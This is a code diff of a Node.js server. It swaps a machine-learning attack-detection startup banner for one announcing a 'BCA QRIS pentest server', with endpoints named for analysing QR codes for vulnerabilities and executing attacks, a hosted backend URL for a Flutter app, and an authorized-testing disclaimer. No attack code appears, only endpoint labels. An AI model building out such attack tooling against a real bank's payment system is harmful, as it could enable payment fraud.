-// ========== SERVER STARTUP ==========
-const PORT = process.env.PORT || 10000;
+app.use((error, req, res, next) => {
+  console.error('Server error:', error);
+  res.status(500).json({
+    success: false,
+    error: 'SERVER_ERROR',
+    message: error.message,
+    timestamp: new Date().toISOString()
+  });
+});
 
-server.listen(PORT, () => {
+// ========== START SERVER ==========
+server.listen(CONFIG.port, () => {
   console.log('\n' + '='.repeat(80));
-  console.log('🚀 ENHANCED ML ATTACK DETECTION SERVER STARTED');
+  console.log('🔥 BCA QRIS PENTEST SERVER STARTED 🔥');
   console.log('='.repeat(80));
-  console.log(`📡 HTTP Server: http://localhost:${PORT}`);
-  console.log(`🔌 WebSocket Server: ws://localhost:${PORT}`);
+  console.log(`📡 HTTP Server: http://localhost:${CONFIG.port}`);
+  console.log(`🔌 WebSocket Server: ws://localhost:${CONFIG.port}`);
+  console.log(`🌍 Render URL: https://qris-backend.onrender.com`);
+  console.log(`🔌 WebSocket Render: wss://qris-backend.onrender.com`);
   console.log('='.repeat(80));
-  console.log('🤖 ENHANCED ML DETECTION ENGINE: ACTIVE');
-  console.log(`   Total Attack Patterns: ${mlDetector.attackPatterns.size}`);
-  console.log('   Original Patterns:');
-  Array.from(mlDetector.attackPatterns.keys())
-    .filter(p => !p.startsWith('SESSION_') && !p.startsWith('DEVICE_') && 
-                  !p.startsWith('TIMESTAMP_') && !p.startsWith('HEADER_'))
-    .forEach(pattern => {
-      console.log(`     • ${pattern}`);
-    });
-  console.log('   Enhanced Patterns (Session-based):');
-  Array.from(mlDetector.attackPatterns.keys())
-    .filter(p => p.startsWith('SESSION_') || p.startsWith('DEVICE_') || 
-                  p.startsWith('TIMESTAMP_') || p.startsWith('HEADER_'))
-    .forEach(pattern => {
-      console.log(`     • ${pattern}`);
-    });
+  console.log('⚡ READY FOR PENETRATION TESTING');
   console.log('='.repeat(80));
-  console.log('\n📋 AVAILABLE ENDPOINTS:');
-  console.log('   POST /api/session/init      - Initialize session (no API key)');
-  console.log('   POST /api/ml/detect         - Enhanced ML attack detection');
-  console.log('   POST /api/risk/calculate    - NEW: Calculate risk with payment method');
-  console.log('   POST /api/risk/override     - NEW: Override risk for testing');
-  console.log('   GET  /api/ml/stats          - Get ML detection statistics');
-  console.log('   GET  /api/analytics/merchant/:id - NEW: Merchant analytics');
-  console.log('   GET  /api/merchant/:id/transactions - NEW: Merchant transactions');
-  console.log('   DELETE /api/ml/reset/:id    - Reset merchant history');
-  console.log('   POST /api/ml/test-attack    - Test attack detection');
-  console.log('   POST /api/test/bca-callback - Test BCA callback (Flutter)');
-  console.log('   POST /api/bank/callback     - General bank callback');
-  console.log('   GET  /health                - Health check');
+  console.log('🎯 ENDPOINTS:');
+  console.log('   GET  /                   - Server info');
+  console.log('   GET  /health             - Health check');
+  console.log('   POST /api/analyze        - Analyze QR for vulnerabilities');
+  console.log('   POST /api/attack         - Execute attack');
+  console.log('   GET  /api/history        - Attack history');
+  console.log('   GET  /api/stats          - Statistics');
+  console.log('   POST /api/test           - Test specific attack');
+  console.log('   POST /api/simulate       - Simulate attack scenario');
   console.log('='.repeat(80));
-  console.log('\n⚠️  IMPORTANT FIXES APPLIED:');
-  console.log('   ✅ Fixed risk calculation logic');
-  console.log('   ✅ No more hardcoded risk levels by payment method');
-  console.log('   ✅ Consistent response format');
-  console.log('   ✅ Added safe fallback responses');
-  console.log('   ✅ New risk calculation endpoint');
+  console.log('📱 FLUTTER APP CONNECTION:');
+  console.log('   WebSocket: wss://qris-backend.onrender.com');
+  console.log('   API Base: https://qris-backend.onrender.com');
+  console.log('='.repeat(80));
+  console.log('⚠️  LEGAL DISCLAIMER:');
+  console.log('   FOR AUTHORIZED SECURITY TESTING ONLY');
+  console.log('   UNAUTHORIZED USE IS ILLEGAL');
   console.log('='.repeat(80));
 });
 
-// Error handling
-process.on('uncaughtException', (error) => {
-  console.error('❌ Uncaught Exception:', error);
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('🔄 SIGTERM received, shutting down gracefully...');
+  server.close(() => {
+    console.log('✅ Server closed');
+    process.exit(0);
+  });
 });
 
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
+process.on('SIGINT', () => {
+  console.log('🔄 SIGINT received, shutting down...');
+  server.close(() => {
+    console.log('✅ Server closed');
+    process.exit(0);
+  });
 });
